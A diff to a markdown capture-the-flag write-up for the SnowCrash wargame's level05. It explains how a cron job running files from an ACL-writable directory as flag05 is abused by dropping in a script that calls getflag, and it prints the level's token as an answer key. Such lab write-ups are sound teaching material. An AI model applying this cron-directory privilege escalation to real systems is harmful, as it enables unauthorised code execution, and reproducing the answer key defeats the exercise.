@@ -10,19 +10,20 @@ qemu-system-x86_64 -m 2048 -cdrom ./SnowCrash.iso -boot d -net nic,model=virtio 
 Exploit a cron job that executes writable scripts to retrieve the flag05 token.
 
 ## Vulnerability
-Arbitrary code execution via writable directory with cron job executing shell scripts as flag05.
+Arbitrary code execution via writable cron script directory with privilege escalation.
 
 ## Discovery
 
 ### Mail Hint
+Check the mail for level05 to discover the cron job:
 ```bash
 cat /var/mail/level05
-*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+# Output: */2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
 ```
 
 The cron job runs every 2 minutes, executing `/usr/sbin/openarenaserver` as flag05.
 
-### Openarenaserver Script
+### Openarenaserver Script Analysis
 ```bash
 cat /usr/sbin/openarenaserver
 #!/bin/sh
@@ -32,26 +33,28 @@ for i in /opt/openarenaserver/* ; do
 done
 ```
 
-The script:
+**The Script Does:**
 1. Loops through all files in `/opt/openarenaserver/`
-2. Executes each with `bash -x` (as flag05)
-3. Deletes the file after execution
+2. Executes each file with bash as flag05
+3. Deletes the file after execution (no cleanup verification)
 
-### Directory Permissions
+### Directory Permissions with ACLs
 ```bash
 ls -la /opt/openarenaserver/
 drwxrwxr-x+ 2 root root
 
 getfacl /opt/openarenaserver/
-default:user:level05:rwx
-default:user:flag05:rwx
+# user:level05:rwx (allows write!)
+# user:flag05:rwx
 ```
 
-Level05 has write permissions via ACL!
+**Key Finding:** Level05 has write permissions via ACL!
 
 ## Exploitation
 
-### Create Exploit Script
+### Step 1: Create Exploit Script
+Create a bash script in the writable cron directory:
+
 ```bash
 cat > /opt/openarenaserver/exploit.sh << 'EOF'
 #!/bin/bash
@@ -59,14 +62,25 @@ whoami > /tmp/whoami.txt
 id >> /tmp/whoami.txt
 getflag >> /tmp/whoami.txt 2>&1
 EOF
+chmod +x /opt/openarenaserver/exploit.sh
 ```
 
-### Wait for Cron Execution
-The cron runs every 2 minutes. Cron executes the script as flag05 because:
-- Cron job: `su -c "sh /usr/sbin/openarenaserver" - flag05`
-- Openarenaserver script: `bash -x "$i"` (executes in flag05's context)
+### Step 2: Wait for Cron Execution
+The cron job runs every 2 minutes:
+- Cron executes: `su -c "sh /usr/sbin/openarenaserver" - flag05`
+- This runs the openarenaserver script as flag05
+- The script finds our exploit.sh and executes it with `bash -x`
+- Our script runs with flag05 privileges
 
-### Extract Token
+### Step 3: Retrieve the Results
+After 2 minutes, check the output file:
+```bash
+cat /tmp/whoami.txt
+# Output includes the flag05 token from getflag
+```
+
+### Step 4: Extract Token
+The token is extracted from the getflag output:
 ```
 Check flag.Here is your token : viuaaale9huek52boumoomioc
 ```
@@ -74,12 +88,14 @@ Check flag.Here is your token : viuaaale9huek52boumoomioc
 ## Security Flaws
 
 1. **Writable script directory**: `/opt/openarenaserver/` is writable by level05
-2. **Cron privilege escalation**: Cron job runs scripts as flag05
-3. **No input validation**: Any file in directory is executed
-4. **File deletion creates race condition**: Scripts deleted after execution (no auditing)
+2. **Cron privilege escalation**: Cron job runs arbitrary scripts as flag05
+3. **No file validation**: No checks on what files are executed
+4. **Predictable execution**: Cron runs every 2 minutes (known timing)
+5. **ACL misconfiguration**: ACLs grant write access to level05 on flag05-owned scripts
+6. **File deletion after execution**: Scripts auto-deleted (but that's after execution)
 
 ## Answer
 
-**Level05 Token**: `viuaaale9huek52boumoomioc`
-**Vulnerability**: Arbitrary Code Execution via Cron Script Directory
-**Impact**: Command execution as flag05 user via writable ACL directory
+- **Level05 Token**: `viuaaale9huek52boumoomioc`
+- **Vulnerability Type**: Arbitrary code execution via cron job with writable script directory
+- **Impact**: Command execution as flag05 user through ACL-based write access
